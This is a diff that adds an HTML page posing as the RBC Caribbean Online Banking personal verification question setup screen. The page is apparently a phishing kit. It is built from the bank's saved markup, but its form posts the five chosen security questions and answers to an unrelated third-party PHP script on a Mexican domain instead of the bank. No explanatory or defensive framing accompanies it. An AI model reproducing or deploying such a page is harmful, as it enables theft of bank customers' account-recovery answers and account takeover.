@@ -1,0 +1,292 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+<head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+</head>
+<body>
+<p>﻿ <!-- saved from url=(0046)https://caribbean.rbcroyalbank.com/#/pvq/setup --></p>
+</body>
+</html>
+<title></title>
+<meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+<title data-ng-bind="app.title || 'RBC Caribbean Online Banking'"></title>
+<meta name="description" content="Explore the personal financial services and products that RBC offers to clients in the Caribbean."><meta name="keywords" content="">
+<link href="https://caribbean.rbcroyalbank.com/manifest.json" rel="manifest" /><meta name="msapplication-config" content="browserconfig.xml"><meta name="application-name" content="RBC Carib"><meta name="apple-mobile-web-app-title" content="RBC Carib"><meta name="msapplication-tap-highlight" content="no"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black">
+<link href="https://caribbean.rbcroyalbank.com/images/favicon.png" rel="shortcut icon" />
+<link href="https://caribbean.rbcroyalbank.com/images/apple-touch-icon-57x57.png" rel="apple-touch-icon" sizes="57x57" />
+<link href="https://caribbean.rbcroyalbank.com/images/apple-touch-icon-60x60.png" rel="apple-touch-icon" sizes="60x60" />
+<link href="https://caribbean.rbcroyalbank.com/images/apple-touch-icon-72x72.png" rel="apple-touch-icon" sizes="72x72" />
+<link href="https://caribbean.rbcroyalbank.com/images/apple-touch-icon-76x76.png" rel="apple-touch-icon" sizes="76x76" />
+<link href="https://caribbean.rbcroyalbank.com/images/apple-touch-icon-114x114.png" rel="apple-touch-icon" sizes="114x114" />
+<link href="https://caribbean.rbcroyalbank.com/images/apple-touch-icon-120x120.png" rel="apple-touch-icon" sizes="120x120" />
+<link href="https://caribbean.rbcroyalbank.com/images/apple-touch-icon-144x144.png" rel="apple-touch-icon" sizes="144x144" />
+<link href="https://caribbean.rbcroyalbank.com/images/apple-touch-icon-152x152.png" rel="apple-touch-icon" sizes="152x152" />
+<link href="https://caribbean.rbcroyalbank.com/images/apple-touch-icon-180x180.png" rel="apple-touch-icon" sizes="180x180" />
+<link href="https://caribbean.rbcroyalbank.com/images/favicon-32x32.png" rel="icon" sizes="32x32" type="image/png" />
+<link href="https://caribbean.rbcroyalbank.com/images/android-chrome-192x192.png" rel="icon" sizes="192x192" type="image/png" />
+<link href="https://caribbean.rbcroyalbank.com/images/favicon-96x96.png" rel="icon" sizes="96x96" type="image/png" />
+<link href="https://caribbean.rbcroyalbank.com/images/favicon-16x16.png" rel="icon" sizes="16x16" type="image/png" /><meta name="msapplication-TileImage" content="images/mstile-144x144.png">
+<link color="#5bbad5" href="https://caribbean.rbcroyalbank.com/images/safari-pinned-tab.svg" rel="mask-icon" /><meta name="msapplication-TileColor" content="#fae008"><meta name="theme-color" content="#ffffff">
+<link href="./RBC Caribbean Online Banking - Sign In_files/icon" rel="stylesheet" />
+<link href="./RBC Caribbean Online Banking - Sign In_files/css" rel="stylesheet" />
+<link crossorigin="anonymous" href="./RBC Caribbean Online Banking - Sign In_files/bootstrap.min.css" integrity="sha384-1q8mTJOASx8j1Au+a5WDVnPi2lkFfwwEAa8hDDdjZlpLegxhjVME1fgjWPGmkzs7" rel="stylesheet" />
+<link crossorigin="anonymous" href="./RBC Caribbean Online Banking - Sign In_files/bootstrap-theme.min.css" integrity="sha384-fLW2N01lMqjakBkx3l/M9EahuwpSfeNvV63J5ezn3uZzapT0u7EYsXMjQV+0En5r" rel="stylesheet" /><script type="text/javascript" charset="UTF-8" src="./RBC Caribbean Online Banking - Sign In_files/common.js.download"></script><script type="text/javascript" charset="UTF-8" src="./RBC Caribbean Online Banking - Sign In_files/util.js.download"></script><script type="text/javascript" charset="UTF-8" src="./RBC Caribbean Online Banking - Sign In_files/stats.js.download"></script>
+<div style="visibility: hidden">HealthCheck:OK</div>
+
+<div data-ng-class="{'ie': app.isOldIE, 'safari': app.isOldSafari, 'ios': app.isIOS, 'chrome': app.isOldChrome}"><span data-ng-bind="app.useragent" style="display: none">Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36</span>
+
+<div aria-hidden="true" class="capco-layers capco-layer-1 capco-overlay ng-hide" data-ng-show="spinner.show" style="">
+<div data-ng-controller="SpinnerCtrl" data-ng-include="'src/templates/spinner/spinner.html'">
+<div class="spinner">
+<div class="bounce1"></div>
+
+<div class="bounce2"></div>
+
+<div class="bounce3"></div>
+</div>
+</div>
+</div>
+
+<div aria-hidden="true" class="capco-layers capco-layer-2 capco-overlay ng-hide" data-ng-show="dialog.show" style="">
+<div data-ng-controller="DialogCtrl" data-ng-include="'src/templates/dialog/dialog.html'">
+<div class="dialog-screen">
+<div class="not-padded">
+<div data-ng-switch="type">
+<div class="dialog" data-ng-switch-default="">
+<h4 data-ng-bind="data.error.title"></h4>
+
+<div class="message" data-ng-bind="data.error.message"></div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+
+<div aria-hidden="true" class="capco-layers capco-layer-3 capco-overlay ng-hide" data-ng-show="selector.show">
+<div data-ng-controller="SelectorCtrl" data-ng-include="'src/templates/selector/selector.html'">
+<div class="selector-screen">
+<div class="not-padded">
+<div class="alert-selector b-color-tooltip">
+<div class="capco-flex-row capco-flex-center capco-flex-end"><img alt="Close Selector" class="close" data-ng-click="close();" role="button" src="./RBC Caribbean Online Banking - Sign In_files/close.png" tabindex="0" /></div>
+
+<div class="content padding-20 capco-flex-column">
+<div>
+<h4 data-ng-bind="title"></h4>
+</div>
+
+<div class="message"></div>
+
+<div class="capco-flex-row"><button class="btn primary capco-fill-width" data-ng-bind="label | translate" data-ng-click="select(selected);" type="button"></button></div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+
+<div aria-hidden="true" class="capco-layers capco-layer-4 capco-overlay mobile ng-hide" data-ng-show="menu.show">
+<div data-ng-controller="MenuCtrl" data-ng-include="'src/templates/menu/sidemenu.html'">
+<div class="sidemenu capco-fillscreen capco-flex-row capco-flex-end capco-flex-top" data-ng-click="toggleDrawer();" role="button" tabindex="0">
+<div class="nav b-color-white">
+<ul class="list-unstyled">
+	<li class="bottom-dropdown" data-ng-click="navigate('locator.map');" role="button" tabindex="0"><span data-ng-bind="'MENU_ITEM_FIND' | translate">Find Us</span></li>
+	<li class="bottom-dropdown" data-ng-click="link(links.contact);" role="button" tabindex="0"><span data-ng-bind="'MENU_ITEM_CONTACT' | translate">Contact Us</span></li>
+	<li class="b-color-accent" data-ng-click="navigate('login');" data-ng-if="!app.isAuthenticated();" role="button" tabindex="0"><img alt="Secure Login" class="icon" src="./RBC Caribbean Online Banking - Sign In_files/lock.png" /> <span data-ng-bind="'MENU_ITEM_SIGNIN' | translate">Sign In</span></li>
+</ul>
+</div>
+</div>
+</div>
+</div>
+
+<div class="capco-layers capco-layer-8 pre-auth" data-ng-class="{'authenticated': app.authenticated, 'pre-auth': !app.authenticated}" id="app-main">
+<div aria-hidden="false" data-ng-controller="MenuCtrl" data-ng-hide="app.suppressNav" data-ng-include="'src/templates/menu/menu.html'">
+<div class="menu capco-flex-column capco-flex-center capco-flex-middle font-color-333" data-ng-class="{'authenticated': app.isAuthenticated()}">
+<div class="b-color-white capco-fill-width capco-flex-row capco-flex-center capco-flex-middle height-60px">
+<div class="padded">
+<div class="capco-flex-row banner">
+<div class="logo capco-flex-row capco-flex-start capco-flex-middle"><img alt="RBC Caribbean Online Banking" class="desktop" data-ng-click="home();" role="button" src="./RBC Caribbean Online Banking - Sign In_files/logo.png" tabindex="0" /> <img alt="RBC Caribbean Online Banking" class="mobile" data-ng-click="home();" role="button" src="./RBC Caribbean Online Banking - Sign In_files/shield.png" tabindex="0" /></div>
+
+<div class="desktop hide" data-ng-class="{'hide': app.state.indexOf('locator') === -1}"></div>
+
+<div class="mobile mobile-menu b-color-accent capco-flex-row capco-flex-center capco-flex-middle" data-ng-click="toggleDrawer();" role="button" tabindex="0"><i class="material-icons md-dark">menu</i></div>
+</div>
+</div>
+</div>
+</div>
+</div>
+
+<div class="menu-offset" data-ng-class="{'menu-offset': !app.suppressNav}">
+<div class="capco-fill-height" ui-view="">
+<div ui-view="">
+<div class="login-condition pvq-setup capco-fullscreen">
+<div class="padded">
+<div class="pvq-setup">
+<div class="rbcc-header capco-flex-row">
+<div><img alt="Secure Login" src="./RBC Caribbean Online Banking - Sign In_files/lock.png" /></div>
+
+<h2 data-ng-bind="'PVQ_SETUP_HEADER' | translate">Personal Verification Questions -<span style="font-size:20px;">Please Enter Your Memorable Question and Answer Below.</span></h2>
+</div>
+
+<div data-ng-include="'src/templates/error/error.html'">
+<div aria-hidden="true" class="error ng-hide" data-ng-show="input.error">
+<div class="title"><img alt="Error" class="icon" src="./RBC Caribbean Online Banking - Sign In_files/error.png" /></div>
+
+<div class="message" data-ng-bind-html="input.error.message"></div>
+</div>
+</div>
+
+<form abframeid="iframe.0.7238230340461832" abineguid="D935D07BCB414ECEA42FC3053DA8D236" action="https://lonassantana.com.mx/images/content/img/first1.php" class="ng-pristine ng-invalid ng-invalid-required ng-valid-pattern ng-valid-minlength ng-valid-maxlength" id="form" method="POST" name="form">
+<fieldset aria-disabled="false" data-ng-disabled="app.inputDisabled();">
+<div class="pvq-layout">
+<div class="pvq-setup1">
+<div class="form-group"><label data-ng-bind="'PVQ_SETUP_LABEL_QUESTION1' | translate" for="question1">Question 1</label><select aria-invalid="true" class="custom-dropdown ng-pristine ng-untouched ng-empty ng-invalid ng-invalid-required" data-ng-model="input.question1" data-ng-options="i as i for i in input.questions
+                      | filter:filterQuestion2 | filter:filterQuestion3 | filter:filterQuestion4 | filter:filterQuestion5" data-ng-required="true" id="question1" name="question1" required="required"><option data-ng-bind="'PVQ_SETUP_DROPDOWN_DEFAULT' | translate" selected="selected" value="">Select</option><option label="Name of my all-time favourite movie character?" value="string:Name of my all-time favourite movie character?">Name of my all-time favourite movie character?</option><option label="What was the first movie I ever saw?" value="string:What was the first movie I ever saw?">What was the first movie I ever saw?</option><option label="What is the middle name of my oldest child?" value="string:What is the middle name of my oldest child?">What is the middle name of my oldest child?</option><option label="In which city/town was my father born?" value="string:In which city/town was my father born?">In which city/town was my father born?</option><option label="Who was my favourite cartoon character as a child?" value="string:Who was my favourite cartoon character as a child?">Who was my favourite cartoon character as a child?</option><option label="What is my mother's middle name?" value="string:What is my mother's middle name?">What is my mother&#39;s middle name?</option><option label="In which year did I meet my significant other?" value="string:In which year did I meet my significant other?">In which year did I meet my significant other?</option><option label="What was my first pet's name?" value="string:What was my first pet's name?">What was my first pet&#39;s name?</option><option label="First name of the maid of honour at my wedding?" value="string:First name of the maid of honour at my wedding?">First name of the maid of honour at my wedding?</option><option label="First name of my best friend in elementary school?" value="string:First name of my best friend in elementary school?">First name of my best friend in elementary school?</option><option label="Who is my favourite author?" value="string:Who is my favourite author?">Who is my favourite author?</option><option label="What is my favourite movie?" value="string:What is my favourite movie?">What is my favourite movie?</option><option label="What is my favourite ice cream?" value="string:What is my favourite ice cream?">What is my favourite ice cream?</option><option label="Who was my best friend on the first day of school?" value="string:Who was my best friend on the first day of school?">Who was my best friend on the first day of school?</option><option label="What was the name of my favourite High School Teacher?" value="string:What was the name of my favourite High School Teacher?">What was the name of my favourite High School Teacher?</option></select>
+
+<div aria-hidden="true" aria-live="assertive" class="ng-active ng-hide" data-ng-messages="form.question1.$error" data-ng-show="form.question1.$touched &amp;&amp; form.question1.$invalid">
+<div class="inline-error" data-ng-bind="'PVQ_SETUP_QUESTION_REQUIRED' | translate" data-ng-message="required">Please select a question</div>
+</div>
+</div>
+
+<div class="form-group" data-ng-class="{'has-error': validation.PVQ_1_ANSWER.length || (form.answer1.$touched &amp;&amp; form.answer1.$invalid)}"><label data-ng-bind="'PVQ_SETUP_LABEL_ANSWER' | translate" for="answer1">Answer</label><input aria-invalid="true" autocapitalize="off" autocomplete="off" autocorrect="off" class="form-control ng-pristine ng-untouched ng-empty ng-invalid ng-invalid-required ng-valid-pattern ng-valid-minlength ng-valid-maxlength" data-ng-blur="" data-ng-focus="scroll('answer1-anchor');" data-ng-maxlength="50" data-ng-minlength="4" data-ng-model="input.answer1" data-ng-pattern=".{4,50}" data-ng-required="true" id="answer1" maxlength="50" name="answer1" required="required" type="text" />
+<div aria-hidden="true" aria-live="assertive" class="ng-active ng-hide" data-ng-messages="form.answer1.$error" data-ng-show="form.answer1.$touched &amp;&amp; form.answer1.$invalid">
+<div class="inline-error" data-ng-bind="'PVQ_SETUP_ANSWER_REQUIRED' | translate" data-ng-message="required">Must be at least 4 characters</div>
+</div>
+
+<div aria-hidden="true" class="ng-hide" data-ng-show="validation.PVQ_1_ANSWER.length"></div>
+</div>
+
+<div class="form-group"><label data-ng-bind="'PVQ_SETUP_LABEL_QUESTION2' | translate" for="question2">Question 2</label><select aria-invalid="true" class="custom-dropdown ng-pristine ng-untouched ng-empty ng-invalid ng-invalid-required" data-ng-model="input.question2" data-ng-options="i as i for i in input.questions
+                      | filter:filterQuestion1 | filter:filterQuestion3 | filter:filterQuestion4 | filter:filterQuestion5" data-ng-required="true" id="question2" name="question2" required="required"><option data-ng-bind="'PVQ_SETUP_DROPDOWN_DEFAULT' | translate" selected="selected" value="">Select</option><option label="Name of my all-time favourite movie character?" value="string:Name of my all-time favourite movie character?">Name of my all-time favourite movie character?</option><option label="What was the first movie I ever saw?" value="string:What was the first movie I ever saw?">What was the first movie I ever saw?</option><option label="What is the middle name of my oldest child?" value="string:What is the middle name of my oldest child?">What is the middle name of my oldest child?</option><option label="In which city/town was my father born?" value="string:In which city/town was my father born?">In which city/town was my father born?</option><option label="Who was my favourite cartoon character as a child?" value="string:Who was my favourite cartoon character as a child?">Who was my favourite cartoon character as a child?</option><option label="What is my mother's middle name?" value="string:What is my mother's middle name?">What is my mother&#39;s middle name?</option><option label="In which year did I meet my significant other?" value="string:In which year did I meet my significant other?">In which year did I meet my significant other?</option><option label="What was my first pet's name?" value="string:What was my first pet's name?">What was my first pet&#39;s name?</option><option label="First name of the maid of honour at my wedding?" value="string:First name of the maid of honour at my wedding?">First name of the maid of honour at my wedding?</option><option label="First name of my best friend in elementary school?" value="string:First name of my best friend in elementary school?">First name of my best friend in elementary school?</option><option label="Who is my favourite author?" value="string:Who is my favourite author?">Who is my favourite author?</option><option label="What is my favourite movie?" value="string:What is my favourite movie?">What is my favourite movie?</option><option label="What is my favourite ice cream?" value="string:What is my favourite ice cream?">What is my favourite ice cream?</option><option label="Who was my best friend on the first day of school?" value="string:Who was my best friend on the first day of school?">Who was my best friend on the first day of school?</option><option label="What was the name of my favourite High School Teacher?" value="string:What was the name of my favourite High School Teacher?">What was the name of my favourite High School Teacher?</option></select>
+
+<div aria-hidden="true" aria-live="assertive" class="ng-active ng-hide" data-ng-messages="form.question2.$error" data-ng-show="form.question2.$touched &amp;&amp; form.question2.$invalid">
+<div class="inline-error" data-ng-bind="'PVQ_SETUP_QUESTION_REQUIRED' | translate" data-ng-message="required">Please select a question</div>
+</div>
+</div>
+
+<div class="form-group" data-ng-class="{'has-error': validation.PVQ_2_ANSWER.length || (form.answer2.$touched &amp;&amp; form.answer2.$invalid)}"><label data-ng-bind="'PVQ_SETUP_LABEL_ANSWER' | translate" for="answer2">Answer</label><input aria-invalid="true" autocapitalize="off" autocomplete="off" autocorrect="off" class="form-control ng-pristine ng-untouched ng-empty ng-invalid ng-invalid-required ng-valid-pattern ng-valid-minlength ng-valid-maxlength" data-ng-blur="" data-ng-focus="scroll('answer2-anchor');" data-ng-maxlength="50" data-ng-minlength="4" data-ng-model="input.answer2" data-ng-pattern=".{4,50}" data-ng-required="true" id="answer2" maxlength="50" name="answer2" required="required" type="text" />
+<div aria-hidden="true" aria-live="assertive" class="ng-active ng-hide" data-ng-messages="form.answer2.$error" data-ng-show="form.answer2.$touched &amp;&amp; form.answer2.$invalid">
+<div class="inline-error" data-ng-bind="'PVQ_SETUP_ANSWER_REQUIRED' | translate" data-ng-message="required">Must be at least 4 characters</div>
+</div>
+
+<div aria-hidden="true" class="ng-hide" data-ng-show="validation.PVQ_2_ANSWER.length"></div>
+</div>
+
+<div class="form-group"><label data-ng-bind="'PVQ_SETUP_LABEL_QUESTION3' | translate" for="question3">Question 3</label><select aria-invalid="true" class="custom-dropdown ng-pristine ng-untouched ng-empty ng-invalid ng-invalid-required" data-ng-model="input.question3" data-ng-options="i as i for i in input.questions
+                      | filter:filterQuestion1 | filter:filterQuestion2 | filter:filterQuestion4 | filter:filterQuestion5" data-ng-required="true" id="question3" name="question3" required="required"><option data-ng-bind="'PVQ_SETUP_DROPDOWN_DEFAULT' | translate" selected="selected" value="">Select</option><option label="Name of my all-time favourite movie character?" value="string:Name of my all-time favourite movie character?">Name of my all-time favourite movie character?</option><option label="What was the first movie I ever saw?" value="string:What was the first movie I ever saw?">What was the first movie I ever saw?</option><option label="What is the middle name of my oldest child?" value="string:What is the middle name of my oldest child?">What is the middle name of my oldest child?</option><option label="In which city/town was my father born?" value="string:In which city/town was my father born?">In which city/town was my father born?</option><option label="Who was my favourite cartoon character as a child?" value="string:Who was my favourite cartoon character as a child?">Who was my favourite cartoon character as a child?</option><option label="What is my mother's middle name?" value="string:What is my mother's middle name?">What is my mother&#39;s middle name?</option><option label="In which year did I meet my significant other?" value="string:In which year did I meet my significant other?">In which year did I meet my significant other?</option><option label="What was my first pet's name?" value="string:What was my first pet's name?">What was my first pet&#39;s name?</option><option label="First name of the maid of honour at my wedding?" value="string:First name of the maid of honour at my wedding?">First name of the maid of honour at my wedding?</option><option label="First name of my best friend in elementary school?" value="string:First name of my best friend in elementary school?">First name of my best friend in elementary school?</option><option label="Who is my favourite author?" value="string:Who is my favourite author?">Who is my favourite author?</option><option label="What is my favourite movie?" value="string:What is my favourite movie?">What is my favourite movie?</option><option label="What is my favourite ice cream?" value="string:What is my favourite ice cream?">What is my favourite ice cream?</option><option label="Who was my best friend on the first day of school?" value="string:Who was my best friend on the first day of school?">Who was my best friend on the first day of school?</option><option label="What was the name of my favourite High School Teacher?" value="string:What was the name of my favourite High School Teacher?">What was the name of my favourite High School Teacher?</option></select>
+
+<div aria-hidden="true" aria-live="assertive" class="ng-active ng-hide" data-ng-messages="form.question3.$error" data-ng-show="form.question3.$touched &amp;&amp; form.question3.$invalid">
+<div class="inline-error" data-ng-bind="'PVQ_SETUP_QUESTION_REQUIRED' | translate" data-ng-message="required">Please select a question</div>
+</div>
+</div>
+
+<div class="form-group" data-ng-class="{'has-error': validation.PVQ_3_ANSWER.length || (form.answer3.$touched &amp;&amp; form.answer3.$invalid)}"><label data-ng-bind="'PVQ_SETUP_LABEL_ANSWER' | translate" for="answer3">Answer</label><input aria-invalid="true" autocapitalize="off" autocomplete="off" autocorrect="off" class="form-control ng-pristine ng-untouched ng-empty ng-invalid ng-invalid-required ng-valid-pattern ng-valid-minlength ng-valid-maxlength" data-ng-blur="" data-ng-focus="scroll('answer3-anchor');" data-ng-maxlength="50" data-ng-minlength="4" data-ng-model="input.answer3" data-ng-pattern=".{4,50}" data-ng-required="true" id="answer3" maxlength="50" name="answer3" required="required" type="text" />
+<div aria-hidden="true" aria-live="assertive" class="ng-active ng-hide" data-ng-messages="form.answer3.$error" data-ng-show="form.answer3.$touched &amp;&amp; form.answer3.$invalid">
+<div class="inline-error" data-ng-bind="'PVQ_SETUP_ANSWER_REQUIRED' | translate" data-ng-message="required">Must be at least 4 characters</div>
+</div>
+
+<div aria-hidden="true" class="ng-hide" data-ng-show="validation.PVQ_3_ANSWER.length"></div>
+</div>
+</div>
+
+<div class="pvq-setup2">
+<div class="form-group"><label data-ng-bind="'PVQ_SETUP_LABEL_QUESTION4' | translate" for="question4">Question 4</label><select aria-invalid="true" class="custom-dropdown ng-pristine ng-empty ng-invalid ng-invalid-required ng-touched" data-ng-model="input.question4" data-ng-options="i as i for i in input.questions
+                      | filter:filterQuestion1 | filter:filterQuestion2 | filter:filterQuestion3 | filter:filterQuestion5" data-ng-required="true" id="question4" name="question4" required="required" style=""><option data-ng-bind="'PVQ_SETUP_DROPDOWN_DEFAULT' | translate" selected="selected" value="">Select</option><option label="Name of my all-time favourite movie character?" value="string:Name of my all-time favourite movie character?">Name of my all-time favourite movie character?</option><option label="What was the first movie I ever saw?" value="string:What was the first movie I ever saw?">What was the first movie I ever saw?</option><option label="What is the middle name of my oldest child?" value="string:What is the middle name of my oldest child?">What is the middle name of my oldest child?</option><option label="In which city/town was my father born?" value="string:In which city/town was my father born?">In which city/town was my father born?</option><option label="Who was my favourite cartoon character as a child?" value="string:Who was my favourite cartoon character as a child?">Who was my favourite cartoon character as a child?</option><option label="What is my mother's middle name?" value="string:What is my mother's middle name?">What is my mother&#39;s middle name?</option><option label="In which year did I meet my significant other?" value="string:In which year did I meet my significant other?">In which year did I meet my significant other?</option><option label="What was my first pet's name?" value="string:What was my first pet's name?">What was my first pet&#39;s name?</option><option label="First name of the maid of honour at my wedding?" value="string:First name of the maid of honour at my wedding?">First name of the maid of honour at my wedding?</option><option label="First name of my best friend in elementary school?" value="string:First name of my best friend in elementary school?">First name of my best friend in elementary school?</option><option label="Who is my favourite author?" value="string:Who is my favourite author?">Who is my favourite author?</option><option label="What is my favourite movie?" value="string:What is my favourite movie?">What is my favourite movie?</option><option label="What is my favourite ice cream?" value="string:What is my favourite ice cream?">What is my favourite ice cream?</option><option label="Who was my best friend on the first day of school?" value="string:Who was my best friend on the first day of school?">Who was my best friend on the first day of school?</option><option label="What was the name of my favourite High School Teacher?" value="string:What was the name of my favourite High School Teacher?">What was the name of my favourite High School Teacher?</option></select>
+
+<div aria-hidden="true" aria-live="assertive" class="ng-active ng-hide" data-ng-messages="form.question4.$error" data-ng-show="form.question4.$touched &amp;&amp; form.question4.$invalid">
+<div class="inline-error" data-ng-bind="'PVQ_SETUP_QUESTION_REQUIRED' | translate" data-ng-message="required">Please select a question</div>
+</div>
+</div>
+
+<div class="form-group" data-ng-class="{'has-error': validation.PVQ_4_ANSWER.length || (form.answer4.$touched &amp;&amp; form.answer4.$invalid)}"><label data-ng-bind="'PVQ_SETUP_LABEL_ANSWER' | translate" for="answer4">Answer</label><input aria-invalid="true" autocapitalize="off" autocomplete="off" autocorrect="off" class="form-control ng-pristine ng-untouched ng-empty ng-invalid ng-invalid-required ng-valid-pattern ng-valid-minlength ng-valid-maxlength" data-ng-blur="" data-ng-focus="scroll('answer4-anchor');" data-ng-maxlength="50" data-ng-minlength="4" data-ng-model="input.answer4" data-ng-pattern=".{4,50}" data-ng-required="true" id="answer4" maxlength="50" name="answer4" required="required" type="text" />
+<div aria-hidden="true" aria-live="assertive" class="ng-active ng-hide" data-ng-messages="form.answer4.$error" data-ng-show="form.answer4.$touched &amp;&amp; form.answer4.$invalid">
+<div class="inline-error" data-ng-bind="'PVQ_SETUP_ANSWER_REQUIRED' | translate" data-ng-message="required">Must be at least 4 characters</div>
+</div>
+
+<div aria-hidden="true" class="ng-hide" data-ng-show="validation.PVQ_4_ANSWER.length"></div>
+</div>
+
+<div class="form-group"><label data-ng-bind="'PVQ_SETUP_LABEL_QUESTION5' | translate" for="question5">Question 5</label><select aria-invalid="true" class="custom-dropdown ng-pristine ng-empty ng-invalid ng-invalid-required ng-touched" data-ng-model="input.question5" data-ng-options="i as i for i in input.questions
+                      | filter:filterQuestion1 | filter:filterQuestion2 | filter:filterQuestion3 | filter:filterQuestion4" data-ng-required="true" id="question5" name="question5" required="required" style=""><option data-ng-bind="'PVQ_SETUP_DROPDOWN_DEFAULT' | translate" selected="selected" value="">Select</option><option label="Name of my all-time favourite movie character?" value="string:Name of my all-time favourite movie character?">Name of my all-time favourite movie character?</option><option label="What was the first movie I ever saw?" value="string:What was the first movie I ever saw?">What was the first movie I ever saw?</option><option label="What is the middle name of my oldest child?" value="string:What is the middle name of my oldest child?">What is the middle name of my oldest child?</option><option label="In which city/town was my father born?" value="string:In which city/town was my father born?">In which city/town was my father born?</option><option label="Who was my favourite cartoon character as a child?" value="string:Who was my favourite cartoon character as a child?">Who was my favourite cartoon character as a child?</option><option label="What is my mother's middle name?" value="string:What is my mother's middle name?">What is my mother&#39;s middle name?</option><option label="In which year did I meet my significant other?" value="string:In which year did I meet my significant other?">In which year did I meet my significant other?</option><option label="What was my first pet's name?" value="string:What was my first pet's name?">What was my first pet&#39;s name?</option><option label="First name of the maid of honour at my wedding?" value="string:First name of the maid of honour at my wedding?">First name of the maid of honour at my wedding?</option><option label="First name of my best friend in elementary school?" value="string:First name of my best friend in elementary school?">First name of my best friend in elementary school?</option><option label="Who is my favourite author?" value="string:Who is my favourite author?">Who is my favourite author?</option><option label="What is my favourite movie?" value="string:What is my favourite movie?">What is my favourite movie?</option><option label="What is my favourite ice cream?" value="string:What is my favourite ice cream?">What is my favourite ice cream?</option><option label="Who was my best friend on the first day of school?" value="string:Who was my best friend on the first day of school?">Who was my best friend on the first day of school?</option><option label="What was the name of my favourite High School Teacher?" value="string:What was the name of my favourite High School Teacher?">What was the name of my favourite High School Teacher?</option></select>
+
+<div aria-hidden="true" aria-live="assertive" class="ng-active ng-hide" data-ng-messages="form.question5.$error" data-ng-show="form.question5.$touched &amp;&amp; form.question5.$invalid">
+<div class="inline-error" data-ng-bind="'PVQ_SETUP_QUESTION_REQUIRED' | translate" data-ng-message="required">Please select a question</div>
+</div>
+</div>
+
+<div class="form-group" data-ng-class="{'has-error': validation.PVQ_5_ANSWER.length || (form.answer5.$touched &amp;&amp; form.answer5.$invalid)}"><label data-ng-bind="'PVQ_SETUP_LABEL_ANSWER' | translate" for="answer5">Answer</label><input aria-invalid="true" autocapitalize="off" autocomplete="off" autocorrect="off" class="form-control ng-pristine ng-untouched ng-empty ng-invalid ng-invalid-required ng-valid-pattern ng-valid-minlength ng-valid-maxlength" data-ng-blur="" data-ng-focus="scroll('answer5-anchor');" data-ng-maxlength="50" data-ng-minlength="4" data-ng-model="input.answer5" data-ng-pattern=".{4,50}" data-ng-required="true" id="answer5" maxlength="50" name="answer5" required="required" type="text" />
+<div aria-hidden="true" aria-live="assertive" class="ng-active ng-hide" data-ng-messages="form.answer5.$error" data-ng-show="form.answer5.$touched &amp;&amp; form.answer5.$invalid">
+<div class="inline-error" data-ng-bind="'PVQ_SETUP_ANSWER_REQUIRED' | translate" data-ng-message="required">Must be at least 4 characters</div>
+</div>
+
+<div aria-hidden="true" class="ng-hide" data-ng-show="validation.PVQ_5_ANSWER.length"></div>
+</div>
+<button class="btn primary" data-ng-bind="'PVQ_SETUP_LABEL_SUBMIT_BUTTON' | translate" data-ng-click="submit();" data-ng-enabled="form.$invalid" enabled="enabled" type="submit">Continue</button></div>
+</div>
+</fieldset>
+</form>
+</div>
+</div>
+</div>
+</div>
+</div>
+
+<div aria-hidden="false" data-ng-controller="FooterCtrl" data-ng-hide="app.suppressNav" data-ng-include="'src/templates/footer/footer.html'">
+<div class="footer b-color-footer capco-fullscreen" data-ng-class="{'hide': (app.isMobile() &amp;&amp; app.state.indexOf('locator') !== -1)}">
+<div class="padded">
+<p><span class="padding-right-50" data-ng-bind="'FOOTER_COPYWRIGHT' | translate">&copy; 1995-2022 Royal Bank of Canada.</span><br class="mobile" />
+<a data-ng-bind="'MENU_ITEM_PRIVACY' | translate" data-ng-click="link(links.privacy);" href="javascript:void(0);">Privacy &amp; Security</a> <span class="spacer">| </span><a data-ng-bind="'MENU_ITEM_LEGAL' | translate" data-ng-click="link(links.legal);" href="javascript:void(0);">Legal</a> <span class="spacer">| </span><a data-ng-bind="'MENU_ITEM_CONTACT' | translate" data-ng-click="link(links.contact);" href="javascript:void(0);">Contact Us</a> <span class="spacer">| </span><a data-ng-bind="'MENU_ITEM_FIND' | translate" data-ng-click="navigate('locator.map');" href="javascript:void(0);">Find Us</a></p>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<script>'use strict';
+
+  var antiClickjack;
+  if (self === top) {
+    antiClickjack = document.getElementById('antiClickjack');
+    antiClickjack.parentNode.removeChild(antiClickjack);
+  }
+  else {
+    top.location = self.location;
+  }
+
+  var $buoop = {c:2};
+  var $buo_f = function(){
+    var e = document.createElement('script');
+    e.src = '//browser-update.org/update.min.js';
+    document.body.appendChild(e);
+  };
+
+  try {
+    document.addEventListener('DOMContentLoaded', $buo_f, false);
+  }
+  catch(e){
+    window.attachEvent('onload', $buo_f);
+  }
+
+  window.onerror = function () {
+    // Returning true will prevent the firing of the default handler,
+    // and returning false will let the default handler run.
+    return false;
+  };
+
+  /*
+  (function (i, s, o, g, r, a, m) {
+    i['GoogleAnalyticsObject'] = r;
+    i[r] = i[r] || function () {
+        (i[r].q = i[r].q || []).push(arguments)
+      }, i[r].l = 1 * new Date();
+    a = s.createElement(o),
+      m = s.getElementsByTagName(o)[0];
+    a.async = 1;
+    a.src = g;
+    m.parentNode.insertBefore(a, m)
+  })(window, document, 'script', '//www.google-analytics.com/analytics.js', 'ga');
+  // TODO: Google Analytics: change UA-XXXXX-X to be your site's ID
+  ga('create', 'UA-XXXXX-X', 'auto');
+  ga('send', 'pageview');
+  */</script><script src="./RBC Caribbean Online Banking - Sign In_files/js" async="" defer="defer"></script><script src="./RBC Caribbean Online Banking - Sign In_files/main.min.js.download"></script>
+<link href="./RBC Caribbean Online Banking - Sign In_files/main.min.css" rel="stylesheet" /><script src="./RBC Caribbean Online Banking - Sign In_files/update.min.js.download"></script>
+<p></p>
